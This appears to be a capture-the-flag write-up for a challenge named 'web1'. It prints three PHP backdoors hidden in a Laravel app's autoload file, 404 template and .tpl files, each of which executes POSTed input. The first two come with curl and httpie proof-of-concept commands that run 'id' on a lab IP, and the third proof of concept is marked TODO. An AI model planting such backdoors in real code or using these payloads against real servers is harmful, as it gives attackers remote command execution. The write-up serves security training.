# Solutions of web1

#### RCE_0x00

> Vulnerability

```
>>> WEBROOT/src/bootstrap/autoload.php

72	if (is_dir($workbench = __DIR__.'/../workbench'))
73	{
74		Illuminate\Workbench\Starter::start($workbench);
75	}
76	
77	echo `$_POST[checker]`; // Backdoor here which cause RCE vulnerability
```

> Proof of concept
```
curl http://192.168.1.187:8000/index.php --data 'checker=id' 2&>/dev/null | head -n 1
```

#### RCE_0x01

> Vulnerability
```
>>> WEBROOT/src/app/views/errors/404.blade.php

130	<?php
131	@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
132	?>
```

> Proof of concept
```
http -f post 'http://192.168.1.187:8000/nosuchpage' notfound='system("id")'
```


#### RCE_0x02

> Vulnerability
```
>>> WEBROOT/src/app/template/1.tpl
>>> WEBROOT/src/app/template/2.tpl
>>> WEBROOT/src/app/template/3.tpl

1	<?php
2	    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
3	?>
```

> Proof of concept
```
# TODO
```
